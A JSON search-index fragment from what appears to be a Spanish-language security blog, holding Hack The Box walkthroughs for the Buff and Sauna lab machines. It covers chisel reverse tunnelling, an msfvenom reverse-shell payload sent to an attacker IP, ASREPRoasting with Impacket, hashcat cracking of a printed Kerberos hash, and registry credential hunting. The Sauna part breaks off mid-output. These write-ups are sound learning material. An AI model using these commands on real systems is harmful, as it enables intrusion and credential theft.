TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 528 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1108 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1504 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 2156 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 672 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 688 TCP 10.10.10.198:139 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING 7844 TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 8416 TCP [::]:135 [::]:0 LISTENING 956 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:7680 [::]:0 LISTENING 4256 TCP [::]:8080 [::]:0 LISTENING 3648 TCP [::]:49664 [::]:0 LISTENING 528 TCP [::]:49665 [::]:0 LISTENING 1108 TCP [::]:49666 [::]:0 LISTENING 1504 TCP [::]:49667 [::]:0 LISTENING 2156 TCP [::]:49668 [::]:0 LISTENING 672 TCP [::]:49669 [::]:0 LISTENING 688 C:\\xampp\\htdocs\\gym\\upload\u0026gt; Utlizamos chisel para realizar reverse tunneling al puerto 8888, descargamos este en la maquina y ejecutamos un tunel reverso de SSH a nuestra maquina, para obtener el puerto 8888 localmente y explotarlo con el exploit que encontramos.\n1 chisel.exe client 10.10.14.44:8080 R:8888:127.0.0.1:8888 En nuestra maquina ejecutamos chisel server:\n1 chisel server -p 8080 --reverse Ahora que tenemos el puerto 8888 localmente podemos explotar este con el exploit pero primero debemos de crear nuestro payload con msfvenom para que ejecute una shell inversa.\n1 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1338 -f c Una vez generado nuestro payload reemplazamos el que esta en el exploit con el nuestro, ponemos a la escucha netcat localmente, ejecutamos el exploit y logramos obtener una shell con usuario Administrator y nuestra flag root.txt.\n","description":"Buff es una maquina de HackTheBox con SO Windows, encontramos un RCE en Gym Managmente Software lo que nos dio acceso con el usuario Shaun. Observamos un puerto localmente perteneciente a CloudMe, ejecutamos un reverse tunneling para poder explotar la vulnerabilidad Buffer Overflow y obtener acceso privilegiado.","id":89,"section":"posts","tags":["chisel","dirbuster","metasploit","msfvenom"],"title":"Hack The Box - Buff","uri":"https://sckull.github.io/posts/buff/"},{"content":"\rSauna una maquina de HackTheBox, encontramos usuarios los cuales utilizamos para crear un wordlist personalizado y realizar ASREPRoast con Impacket lo que nos dio acceso por WinRM. Accedimos a un segundo usuario con una contraseña que encontramos en el registro de windows. Finalmente enumeramos con BloodHound y con la informacion recolectada obtuvimos acceso con ACLPwn para luego realizar Pass-the-Hash y obtener acceso privilegiado con PSExec.\nInformacion de la Maquina Nombre Sauna OS Windows Puntos 20 Dificultad Facil IP 10.10.10.175 Maker egotisticalSW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.2, 7.9, 6.6, 3.4, 2.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 10, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # Nmap 7.80 scan initiated Tue Feb 25 00:32:17 2020 as: nmap -p- --min-rate 1000 -sV -o nmap_scan 10.10.10.175 Nmap scan report for 10.10.10.175 Host is up (0.23s latency). Not shown: 65516 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-25 14:36:02Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49682/tcp open msrpc Microsoft Windows RPC 55601/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=2/25%Time=5E54C001%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 25 00:37:01 2020 -- 1 IP address (1 host up) scanned in 283.37 seconds NMAP LDAP Utilizamos el script ldap-search de nmap, y encontramos mucha informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 # Nmap 7.80 scan initiated Tue Feb 25 00:41:12 2020 as: nmap --script=ldap-search -p389 -o nmap_ldap_script 10.10.10.175 Nmap scan report for 10.10.10.175 Host is up (0.083s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: DC=EGOTISTICAL-BANK,DC=LOCAL | dn: DC=EGOTISTICAL-BANK,DC=LOCAL | objectClass: top | objectClass: domain | objectClass: domainDNS | distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL | instanceType: 5 | whenCreated: 2020/01/23 05:44:25 UTC | whenChanged: 2020/02/25 14:32:31 UTC | subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL | subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL | subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | uSNCreated: 4099 | dSASignature: \\x01\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\xBE\\xE0\\xB3\\xC6%\\xECD\\xB2\\xB9\\x9F\\xF8\\D\\xB2\\xEC | uSNChanged: 53269 | name: EGOTISTICAL-BANK | objectGUID: 504e6ec-c122-a143-93c0-cf487f83363 | replUpToDateVector: \\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xFDZ\\x85\\x92F\\xDE^A\\xAAVnj@#\\xF6\\x0C\\x0B\\xD0\\x00\\x00\\x00\\x00\\x00\\x00\\xFE\\xC0e\\x14\\x03\\x00\\x00\\x00@\\xBE\\xE0\\xB3\\xC6%\\xECD\\xB2\\xB9\\x9F\\xF8\\D\\xB2\\xEC\t\\xB0\\x00\\x00\\x00\\x00\\x00\\x00\\xD4\\x04R\\x14\\x03\\x00\\x00\\x00 | creationTime: 132271147519409907 | forceLogoff: -9223372036854775808 | lockoutDuration: -18000000000 | lockOutObservationWindow: -18000000000 | lockoutThreshold: 0 | maxPwdAge: -36288000000000 | minPwdAge: -864000000000 | minPwdLength: 7 | modifiedCountAtLastProm: 0 | nextRid: 1000 | pwdProperties: 1 | pwdHistoryLength: 24 | objectSid: 1-5-21-2966785786-3096785034-1186376766 | serverState: 1 | uASCompat: 1 | modifiedCount: 1 | auditingPolicy: \\x00\\x01 | nTMixedDomain: 0 | rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL | fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | systemFlags: -1946157056 | wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL | objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | isCriticalSystemObject: TRUE | gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0] | dSCorePropagationData: 1601/01/01 00:00:00 UTC | otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL | otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL | masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | ms-DS-MachineAccountQuota: 10 | msDS-Behavior-Version: 7 | msDS-PerUserTrustQuota: 1 | msDS-AllUsersTrustQuota: 1000 | msDS-PerUserTrustTombstonesQuota: 10 | msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | msDS-NcType: 0 | msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE | dc: EGOTISTICAL-BANK | dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL |_ dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL # Nmap done at Tue Feb 25 00:41:13 2020 -- 1 IP address (1 host up) scanned in 1.03 seconds USER - FSmith En el puerto 80 esta corriendo una pagina en la cual podemos obtener los nombres de las personas que pertenecen a esta empresa, utilizando estos nombres creamos un diccionario con diferentes conbinaciones entre si, en el reporte de nmap con el script de ldap-search podemos ver otro nombre \u0026lsquo;Hugo Smith\u0026rsquo; el cual vamos a agregar a nuestro diccionario de nombres.\nTesting for Weak password policy\nNombres\nCombinacion de nombres de usuarios con script de python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/usr/bin/env python import sys if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print \u0026#34;usage: %s names.txt\u0026#34; % (sys.argv[0]) sys.exit(0) for line in open(sys.argv[1]): name = \u0026#39;\u0026#39;.join([c for c in line if c == \u0026#34; \u0026#34; or c.isalpha()]) tokens = name.lower().split() fname = tokens[0] lname = tokens[-1] print fname + lname\t# johndoe print lname + fname\t# doejohn print fname + \u0026#34;.\u0026#34; + lname\t# john.doe print lname + \u0026#34;.\u0026#34; + fname\t# doe.john print lname + fname[0]\t# doej print fname[0] + lname\t# jdoe print lname[0] + fname\t# djoe print fname[0] + \u0026#34;.\u0026#34; + lname\t# j.doe print lname[0] + \u0026#34;.\u0026#34; + fname\t# d.john print fname\t# john Utilizamos GetNPUsers de impacket para obtener informacion de LDAP junto con la lista de usuarios sin autenticacion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 root@aoiri:~/htb/sauna# python /root/tools/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile list_users.txt -request -format hashcat -outputfile hashes.asreproast Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [... snip ...] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User hsmith doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [... snip ...] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:42fc70db3f5d9b26862ee8a381f41300$bfc70df530d642039f9c1135e399e4cf27e8ddb75f8a2dbc9b37b4b66226b9d733452368075ea1bfee410a0e18430b2320407c02aa161cd9be0ed96285ced026eb233fbfa2e9b65991321c6d9c4bf9556f32759eb9fe92f239b91543a2f96e643e2f30fe3c8b59c83e39104a3134c165feec05d2d993962a716e495b9c629a63d9e35355337d280ec389ef730495aead980f9a5a9654c9f356553ca484c2014a411a2e812906a6a1ba7e133456cf0bf532d2d682d451e8577f35c6059474e6829e5d0e3bfed887828cbe7efb36d946e13ed6a2aa67ca2819e587d68386244d055998571d4a5a5831935e47dfdac4caf73072c6592af0ad0226e94e3657b71e40 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [... snip ...] root@aoiri:~/htb/sauna# Hashes capturadas\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a55cd08ff4f2298bf6d2eaea41$9b8899d4f678c22f5171bb699d87d51a08520d8206cc6967017f65bee3fb3d814855da6929a1691b6fb3d430cf0ee2697022ecce332fd29d3af31fce8766b67d90ead50310c7238dd9a6a48478fc0d25c1c0a8e8cea418795d36d56b8c6c2069f0aad851172a4dedeb7c5898a44e36401383718caaaaab04a670d4dbd6ef42f84bf097f4e180cb9cc9b00b497e6a758aa5084aa46d9f365d6f5896eea79954e553510369d1bfaeed9a1f4ce63125aeddcc1a533c16e19047a211457455470338e12d2e970a234a98203e9808c67a2b97356f4d89d8da0d115c91fd5a294b7daf2c69321b4ac2d6dfa38f470fd1f9854148342442ca44437c1c099c39db5fdd5a Utilizamos hashcat para crackear la contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 ➜ hashcat ./hashcat64.bin -m 18200 sauna_hash ../rockyou.txt -o sauna_cracked.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 AS-REP etype 23 Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a...5fdd5a Time.Started.....: Wed Feb 26 15:45:34 2020 (6 secs) Time.Estimated...: Wed Feb 26 15:45:40 2020 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2115.6 kH/s (9.59ms) @ Accel:256 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10567680/14344385 (73.67%) Rejected.........: 0/10567680 (0.00%) Restore.Point....: 10518528/14344385 (73.33%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: VALERIA05 -\u0026gt; TGWild\\\\ Hardware.Mon.#1..: Temp: 57c Util: 37% Core:1189MHz Mem:2505MHz Bus:4 Started: Wed Feb 26 15:45:26 2020 Stopped: Wed Feb 26 15:45:41 2020 ➜ hashcat cat sauna_cracked.txt $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a55cd08ff4f2298bf6d2eaea41$9b8899d4f678c22f5171bb699d87d51a08520d8206cc6967017f65bee3fb3d814855da6929a1691b6fb3d430cf0ee2697022ecce332fd29d3af31fce8766b67d90ead50310c7238dd9a6a48478fc0d25c1c0a8e8cea418795d36d56b8c6c2069f0aad851172a4dedeb7c5898a44e36401383718caaaaab04a670d4dbd6ef42f84bf097f4e180cb9cc9b00b497e6a758aa5084aa46d9f365d6f5896eea79954e553510369d1bfaeed9a1f4ce63125aeddcc1a533c16e19047a211457455470338e12d2e970a234a98203e9808c67a2b97356f4d89d8da0d115c91fd5a294b7daf2c69321b4ac2d6dfa38f470fd1f9854148342442ca44437c1c099c39db5fdd5a:Thestrokes23 ➜ hashcat SMBMAP Utilizamos smbmap con las credenciales que encontramos para enumerar los SHARENAMES a los que el usuario fsmith puede acceder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 root@aoiri:~/htb/sauna# smbmap -H 10.10.10.175 -u fsmith -p \u0026#39;Thestrokes23\u0026#39; [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.175... [+] IP: 10.10.10.175:445\tName: 10.10.10.175 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin C$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-360-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1cc-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-420-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-5b0-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-260-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-260-1 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\49670 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tb75206e9c2133cf5 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\593 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-b94-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tnetdfs fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-250-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tROUTER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-8f4-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-7d4-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272457929604436.3680.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiisipm8edc73b6-375e-4404-816c-f06e9ca4e3d2 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiislogpipe5ec33ab0-ed89-4506-a437-f8c09f25dfcb fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272481319626253.3316.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272541365899156.5756.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272546170148799.3268.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272548732993844.5392.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272549933510639.4140.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272556670204143.3228.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272557556503609.1872.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC . dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t. dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t.. NETLOGON READ ONLY\tLogon server share . dr--r--r-- 0 Wed Jan 22 23:32:39 2020\t. dr--r--r-- 0 Wed Jan 22 23:32:39 2020\t.. dr--r--r-- 0 Wed Jan 22 23:29:26 2020\tcolor dr--r--r-- 0 Wed Jan 22 23:32:39 2020\tIA64 dr--r--r-- 0 Thu Jan 23 17:10:43 2020\tW32X86 dr--r--r-- 0 Thu Jan 23 17:10:42 2020\tx64 print$ READ ONLY\tPrinter Drivers RICOH Aficio SP 8300DN PCL 6 NO ACCESS\tWe cant print money . dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t. dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t.. dr--r--r-- 0 Wed Jan 22 23:44:49 2020\tEGOTISTICAL-BANK.LOCAL SYSVOL READ ONLY\tLogon server share root@aoiri:~/htb/sauna# Vemos que tiene permisos de solo lectura en IPC$, NETLOGON, print$ y SYSVOL.\nEVIL-WINRM Ya que esta abierto el puerto 5985 de winrm utilizamos las credenciales y evilwinrm para obtener una shell y con ello nuestra flag user.txt.\nUSER - svc_loanmgr Hacemos una enumeracion para buscar contraseñas utilizando querys en el registro de windows con comandos de PayloadsAlltheThings.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon AutoRestartShell REG_DWORD 0x1 Background REG_SZ 0 0 0 CachedLogonsCount REG_SZ 10 DebugServerCommand REG_SZ no DefaultDomainName REG_SZ EGOTISTICALBANK DefaultUserName REG_SZ EGOTISTICALBANK\\svc_loanmanager DisableBackButton REG_DWORD 0x1 EnableSIHostIntegration REG_DWORD 0x1 ForceUnlockLogon REG_DWORD 0x0 LegalNoticeCaption REG_SZ LegalNoticeText REG_SZ PasswordExpiryWarning REG_DWORD 0x5 PowerdownAfterShutdown REG_SZ 0 PreCreateKnownFolders REG_SZ {A520A1A4-1780-4FF6-BD18-167343C5AF16} ReportBootOk REG_SZ 1 Shell REG_SZ explorer.exe ShellCritical REG_DWORD 0x0 ShellInfrastructure REG_SZ sihost.exe SiHostCritical REG_DWORD 0x0 SiHostReadyTimeOut REG_DWORD 0x0 SiHostRestartCountLimit REG_DWORD 0x0 SiHostRestartTimeGap REG_DWORD 0x0 Userinit REG_SZ C:\\Windows\\system32\\userinit.exe, VMApplet REG_SZ SystemPropertiesPerformance.exe /pagefile WinStationsDisabled REG_SZ 0 scremoveoption REG_SZ 0 DisableCAD REG_DWORD 0x1 LastLogOffEndTimePerfCounter REG_QWORD 0x8e3982368 ShutdownFlags REG_DWORD 0x80000027 DisableLockWorkstation REG_DWORD 0x0 DefaultPassword REG_SZ Moneymakestheworldgoround! HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\AlternateShells HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\GPExtensions HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\UserDefaults HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\AutoLogonChecked 